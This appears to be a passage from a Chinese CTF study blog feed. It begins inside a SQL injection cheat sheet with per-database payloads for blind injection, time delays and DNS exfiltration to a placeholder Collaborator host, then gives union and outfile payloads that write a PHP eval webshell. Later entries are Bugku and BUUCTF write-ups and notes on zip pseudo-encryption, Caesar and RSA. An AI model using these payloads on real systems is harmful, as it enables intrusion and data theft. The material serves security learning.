<td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
</tr>
</tbody></table>
<h2 id="批量（或堆叠）查询"><a href="#批量（或堆叠）查询" class="headerlink" title="批量（或堆叠）查询"></a>批量（或堆叠）查询</h2><p>您可以使用批处理查询来连续执行多个查询。请注意，在执行后续查询时，不会将结果返回给应用程序。因此，该技术主要用于解决盲漏洞，您可以使用第二个查询来触发 DNS 查找、条件错误或时间延迟。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>Does not support batched queries.</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
</tbody></table>
<h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><p>对于 MySQL，批处理查询通常不能用于 SQL 注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库通信，这偶尔是可能的。</p>
<h2 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h2><p>处理查询时，您可能会在数据库中造成时间延迟。以下将导致 10 秒的无条件时间延迟。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>SELECT pg_sleep(10)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT SLEEP(10)</code></td>
</tr>
</tbody></table>
<h2 id="有条件的时间延迟"><a href="#有条件的时间延迟" class="headerlink" title="有条件的时间延迟"></a>有条件的时间延迟</h2><p>您可以测试单个布尔条件并在条件为真时触发时间延迟。</p>
<p>| 甲骨文 | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;||dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual</code> |<br>| :—– | ———————————————————— |<br>| 微软   | <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code>            |<br>| 数据库 | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code> |<br>| MySQL  | <code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code>               |</p>
<h2 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h2><p>您可以使数据库对外部域执行 DNS 查找。为此，您需要使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认是否进行了 DNS 查找。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th>以下技术利用 XML 外部实体 ( <a href="https://portswigger.net/web-security/xxe">XXE</a> ) 漏洞触发 DNS 查找。该漏洞已被修补，但存在许多未修补的 Oracle 安装： <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code>  以下技术适用于完全修补的 Oracle 安装，但需要提升权限： <code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td>以下技术仅适用于 Windows： <code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td>
</tr>
</tbody></table>
<h2 id="带数据泄露的-DNS-查找"><a href="#带数据泄露的-DNS-查找" class="headerlink" title="带数据泄露的 DNS 查找"></a>带数据泄露的 DNS 查找</h2><p>您可以使数据库对包含注入查询结果的外部域执行 DNS 查找。为此，您需要使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的详细信息，包括泄露的数据。</p>
<p>| 甲骨文 | <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> |<br>| :—– | ———————————————————— |<br>| 微软   | <code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code> |<br>| 数据库 | <code>create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;execute c;END;$$ language plpgsql security definer;SELECT f();</code> |<br>| MySQL  | 以下技术仅适用于 Windows： <code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code> |</p>
<h2 id="SQL注入怎么写入webshell？"><a href="#SQL注入怎么写入webshell？" class="headerlink" title="SQL注入怎么写入webshell？"></a>SQL注入怎么写入webshell？</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>1、知道web绝对路径</p>
<p>2、有文件写入权限(一般情况只有ROOT用户有)</p>
<p>3、数据库开启了secure_file_priv设置</p>
<p>​    然后就能用select into outfile写入webshell</p>
<h3 id="常见手法："><a href="#常见手法：" class="headerlink" title="常见手法："></a>常见手法：</h3><p><strong>联合注入写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into outfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>dumpfile函数写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into dumpfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>lines terminated by 写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines terminated by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span>
<span class="token comment">//lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>lines starting by 写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines starting by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span>
<span class="token comment">//利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>fields terminated by 写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/work/shell.php'</span> fields terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span>
<span class="token comment">//利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>columns terminated by 写入</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> <span class="token constant">COLUMNS</span> terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span>
<span class="token comment">//利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>sqlmap写入</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">写：<span class="token punctuation">(</span>要写的文件，必须在kali本机里有<span class="token punctuation">)</span>
写入到 <span class="token operator">/</span>tmp 目录下  
sqlmap <span class="token operator">-</span>u "http:<span class="token comment">//127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;us</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku之web部分解题思路</title>
    <url>/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p><strong>知识点：正则表达式</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zero</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'zero'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$second</span><span class="token operator">=</span><span class="token variable">$zero</span><span class="token operator">.</span><span class="token variable">$first</span><span class="token punctuation">;</span><span class="token comment">//将zero和first连接起来</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Yeedo|wants|a|girl|friend|or|a|flag/i"</span><span class="token punctuation">,</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$second</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.\.|flag/"</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noooood hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$third</span><span class="token operator">=</span><span class="token variable">$first</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\|\056\160\150\x70/i"</span><span class="token punctuation">,</span><span class="token variable">$third</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  解码后：”|.php“</span>
            <span class="token variable">$end</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$third</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$zero</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//maybe flag in flag.php</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>error_reporting(0)<strong>表示不报告错误<br>然后用$REQUEST传zero和first<br>second&#x3D;zero.first<br>second中要包含</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>这里面的其中一个，并且不区分大小写。<br>然后key&#x3D;second&#x3D;zero.first<br>key中不能有</strong>..<strong>和</strong>flag</strong>。<br>另外，third&#x3D;first。<br><strong>\056\160\150</strong>为八进制，<strong>\x70</strong>为十六进制<br>third中要有**|.php<strong>，</strong>substr**是截取字符，end取值时从third的第5位开始取值，然后得到base64解密的zero与end连接</p>
<p><strong>思路：</strong></p>
<p>先在zero中传入base74加密后的flag(<strong>ZmxhZw&#x3D;&#x3D;</strong>)，提示说flag在flag.php中，所以我们最后要构造出flag.php。而第一个if会把flag过滤掉，又考虑到最后会进行base64解码与first拼接，所以flag就用base64加密传到zero中，由于第二个if把**..<strong>过滤掉了，如果直接在first中传入了.php后，second会变成flag..php，会被过滤。sudstr会截取掉前四个字符，从第五个字符开始接收，并且first值中要包含</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>其中一个才能正常往下进行，所以first直接传入</strong>flag|.php**<br><strong>所以构建?zero&#x3D;ZmxhZw&#x3D;&#x3D;&amp;first&#x3D;flag|.php</strong></p>
<h3 id="x-y"><a href="#x-y" class="headerlink" title="x|y"></a>x|y</h3><p><strong>x|y，匹配 x 或 y。<br>例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</strong></p>
]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>python部分知识点</title>
    <url>/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="列表的方法"><a href="#列表的方法" class="headerlink" title="列表的方法"></a>列表的方法</h2><p><img src="https://img-blog.csdnimg.cn/8199ffcbcaed48d289971c6f7fcef868.png#pic_center" alt="1"></p>
<h2 id="列表的特点"><a href="#列表的特点" class="headerlink" title="列表的特点"></a>列表的特点</h2><p><img src="https://img-blog.csdnimg.cn/931e8889a21040b7a22be771851fec85.png#pic_center" alt="2"></p>
<h2 id="while循环与for循环的对比"><a href="#while循环与for循环的对比" class="headerlink" title="while循环与for循环的对比"></a>while循环与for循环的对比</h2><p><img src="https://img-blog.csdnimg.cn/9e00c957396d443cb930f782490b7c06.png#pic_center" alt="3"></p>
<h2 id="字符串常用操作"><a href="#字符串常用操作" class="headerlink" title="字符串常用操作"></a>字符串常用操作</h2><p><img src="https://img-blog.csdnimg.cn/6f36aeff3ac04f34ba832b2b58ecea21.png#pic_center" alt="1"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ptython</tag>
      </tags>
  </entry>
  <entry>
    <title>zip伪加密</title>
    <url>/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>



<p><strong>zip伪加密</strong>是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p>
<p>一个 ZIP 文件由<strong>三个部分</strong>组成：</p>
<p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p>
<h2 id="压缩源文件数据区："><a href="#压缩源文件数据区：" class="headerlink" title="压缩源文件数据区："></a>压缩源文件数据区：</h2><p>50 4B 03 04：这是头文件标记（0x04034b50）</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>00 00：扩展记录长度</p>
<h2 id="压缩源文件目录区："><a href="#压缩源文件目录区：" class="headerlink" title="压缩源文件目录区："></a>压缩源文件目录区：</h2><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p>
<p>3F 00：压缩使用的 pkware 版本</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>24 00：扩展字段长度</p>
<p>00 00：文件注释长度</p>
<p>00 00：磁盘开始号</p>
<p>00 00：内部文件属性</p>
<p>20 00 00 00：外部文件属性</p>
<p>00 00 00 00：局部头部偏移量</p>
<h2 id="压缩源文件目录结束标志："><a href="#压缩源文件目录结束标志：" class="headerlink" title="压缩源文件目录结束标志："></a>压缩源文件目录结束标志：</h2><p>50 4B 05 06：目录结束标记</p>
<p>00 00：当前磁盘编号</p>
<p>00 00：目录区开始磁盘编号</p>
<p>01 00：本磁盘上纪录总数</p>
<p>01 00：目录区中纪录总数</p>
<p>59 00 00 00：目录区尺寸大小</p>
<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
<p>00 00：ZIP 文件注释长度</p>
<p>因此，根据此题目来看：</p>
<p><strong>压缩源文件数据区</strong>：50 4B 03 04：这是头文件标记</p>
<p><strong>压缩源文件目录区：</strong></p>
<p>50 4B 01 02：目录中文件文件头标记</p>
<p>3F 00：压缩使用的 pkware 版本 </p>
<p>14 00：解压文件所需 pkware 版本 </p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p><strong>压缩源文件目录结束标志</strong> ：50 4B 05 06：目录结束标记 </p>
<p><img src="https://img-blog.csdnimg.cn/b4f6011275304c798465c33b8b83a77e.png" alt="1"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf之MISC</title>
    <url>/2023/01/10/buuctf%E4%B9%8BMISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><blockquote>
<p>给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对&#x3D; &#x3D;我说了什么了不得的东西。。 注意：得到的 flag 请包上 flag{} 提交</p>
</blockquote>
<p>下载文件解压之后又得到一个压缩包flag.txt被加密了，提示密码是一个4位数字，用ARCHPR进行暴力破解，选择字典进行爆破<br><img src="https://img-blog.csdnimg.cn/c5332cec653f456dbf9d874b3cb7a2c3.png" alt="1"><br>得到密码，输入密码后得到一个base64加密的密文，解密后为flag。</p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote>
<p>黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交</p>
</blockquote>
<p>得到一个pcap文件</p>
<blockquote>
<p> pcap文件是常用的数据报存储格式，可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的，所以我们想要解析里面的数据，也必须按照一定的格式。普通的记事本打开pcap文件显示的是乱码，用安装了HEX-Editor插件的Notepad++打开，能够以16进制数据的格式显示，用wireshark这种抓包工具就可以正常打开这种文件，愉快地查看里面的网络数据报了，同时wireshark也可以生成这种格式的文件。当然这些工具只是我经常使用的，还有很多其它能够查看pcap文件的工具。</p>
</blockquote>
<p>显然是流量分析，登陆网站一般是HTTP post请求，用wireshark打开这个pcap数据包后，查找http,只有一个post请求<br><img src="https://img-blog.csdnimg.cn/2d8aee32f07a487d850f0b12fbd4e267.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/6128dbdf6f9c4bbabe0e3ab4d8e36c64.png" alt="2"><br>找到flag.</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>打开后给一个校徽，由于题目是LSB</p>
<p><img src="https://img-blog.csdnimg.cn/64da9c8efb0a43d9b91316ee9b886da0.png" alt="1"></p>
<blockquote>
<p>LSB全称leastsignificant bit，是一种基于图片最低有效位修改储存信息的隐写方法，图片采用像素点构乘，利用人肉眼视觉分辨率的限制，像素点的低位变化引起图片整体的变化微乎其微，肉眼不足与察觉出异常。同样的MLSB旨在不被人眼察觉出异常的情况下，尽可能的多藏几位信息，从而提高消息隐藏的效率和容量。</p>
</blockquote>
<p>那就用stegsolve打开<br><img src="https://img-blog.csdnimg.cn/ef28ba074c0f480fb77fdf873f929c14.png" alt="2"><br>得到一个二维码<br><img src="https://img-blog.csdnimg.cn/1f0756bb9f6e4fb6824fb3d4c92ef795.png" alt="3"><br>扫二维码得到flag。</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>被伪加密了，用010editor打开<br><img src="https://img-blog.csdnimg.cn/81cfb24d08d3451580870b94ad0da351.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/da5cdea1475a4986bf29cd72e26ecbf5.png" alt="2"><br><strong>09 00改为00 00</strong>保存后得到flag。<strong>flag{Adm1N-B2G-kU-SZIP}</strong></p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf之crypto部分解题思路</title>
    <url>/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><p><strong>题目</strong></p>
<blockquote>
<p>公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。<br>他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。<br>以下密文被解开后可以获得一个有意义的单词：<strong>FRPHEVGL</strong><br>你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</p>
</blockquote>
<p>进行凯撒密码解密<br>python脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token builtin">max</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        plaint<span class="token operator">=</span><span class="token string">''</span>
        <span class="token keyword">for</span> s <span class="token keyword">in</span> secret<span class="token punctuation">:</span>
            o<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>offset
            o<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token operator">-</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> o<span class="token operator">></span><span class="token builtin">max</span> <span class="token keyword">else</span> o
            plaint<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plaint<span class="token punctuation">,</span>offset<span class="token punctuation">)</span>

str_secret<span class="token operator">=</span><span class="token string">'FRPHEVGL'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
decode<span class="token punctuation">(</span>str_secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到：</p>
<blockquote>
<p>frphevgl 0<br>gsqifwhm 1<br>htrjgxin 2<br>iuskhyjo 3<br>jvtlizkp 4<br>kwumjalq 5<br>lxvnkbmr 6<br>mywolcns 7<br>nzxpmdot 8<br>oayqnepu 9<br>pbzrofqv 10<br>qcaspgrw 11<br>rdbtqhsx 12<br>security 13<br>tfdvsjuz 14<br>ugewtkva 15<br>vhfxulwb 16<br>wigyvmxc 17<br>xjhzwnyd 18<br>ykiaxoze 19<br>zljbypaf 20<br>amkczqbg 21<br>bnldarch 22<br>comebsdi 23<br>dpnfctej 24<br>eqogdufk 25</p>
</blockquote>
<p>移位13得到security。再对附件中的密文加密：ComeChina<br>注意大小写</p>
<p><img src="https://img-blog.csdnimg.cn/cc5d04de020147259e4ab27b26e5a941.png" alt="1"><br>P要大写<strong>flag{PbzrPuvan}</strong></p>
<h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><blockquote>
<p>Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.&#x2F;&#x2F;数学很酷！使用 RSA 算法解码秘密消息，c、 p、 q 和 e 是 RSA 算法的参数</p>
</blockquote>
<blockquote>
<p>p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483<br>q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407<br>e &#x3D;  65537<br>c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</p>
</blockquote>
<blockquote>
<p>Use RSA to find the secret message&#x2F;&#x2F;使用RSA来找到秘密消息</p>
</blockquote>
<p>已知c,p,q,e,n&#x3D;p*q,求明文M<br>python脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''已知p,q,e,c.很明朗了，求d再解：'''</span>
<span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>
